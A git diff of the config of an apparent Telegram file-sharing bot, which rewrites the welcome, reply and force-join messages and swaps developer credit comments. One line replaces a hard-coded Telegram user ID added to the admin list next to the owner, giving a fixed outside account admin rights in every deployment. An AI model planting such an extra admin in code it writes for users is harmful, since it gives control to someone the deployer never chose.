@@ -59,19 +59,18 @@ BOT_STATS_TEXT = "<b>BOT UPTIME :</b>\n{uptime}"
 
 
 
-USER_REPLY_TEXT = "<b>ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴍʏ ᴀᴅᴍɪɴ</b> !"
+USER_REPLY_TEXT = "❌Don't Send Me Messages Directly I'm Only File Share Bot !"
 
-START_MSG = os.environ.get("START_MESSAGE", "Hᴇʟʟᴏ {mention}\n\nɪ ᴄᴀɴ sᴛᴏʀᴇ ᴘʀɪᴠᴀᴛᴇ ғɪʟᴇs ɪɴ sᴘᴇᴄɪғɪᴇᴅ ᴄʜᴀɴɴᴇʟ ᴀɴᴅ ᴏᴛʜᴇʀs ᴜsᴇʀs ᴄᴀɴ ᴀᴄᴄᴇss ɪᴛ ғʀᴏᴍ sᴘᴇᴄɪᴀʟ ʟɪɴᴋ.</b>")
+START_MSG = os.environ.get("START_MESSAGE", "Hello {mention}\n\nI Can Store Private Files In Specified Channel And Other Users Can Access It From Special Link.")
 
-FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "<b>**<blockquote>›› ʜᴇʏ {mention} × </blockquote>**</b>\n\n<b>ʏᴏᴜʀ ғɪʟᴇ ɪs ʀᴇᴀᴅʏ ʟᴏᴏᴋs ʟɪᴋᴇ ʏᴏᴜ ʜᴀᴠᴇɴ'ᴛ ᴊᴏɪɴ. "
-"ᴛᴏ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs ʏᴇᴛ, ᴊᴏɪɴ ɴᴏᴡ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ғɪʟᴇs.‼️</b>")
+FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {mention}\n\n<b>You Need To Join In My Channel/Group To Use Me\n\nKindly Please Join Channel</b>")
 
 
 
 
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(6987158459)
+ADMINS.append(6848088376)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
@@ -99,5 +98,8 @@ def LOGGER(name: str) -> logging.Logger:
 
 
 
-# Akash Developer 
+# Jishu Developer 
 # Don't Remove Credit 🥺
+# Telegram Channel @Madflix_Bots
+# Backup Channel @JishuBotz
+# Developer @JishuDeveloper
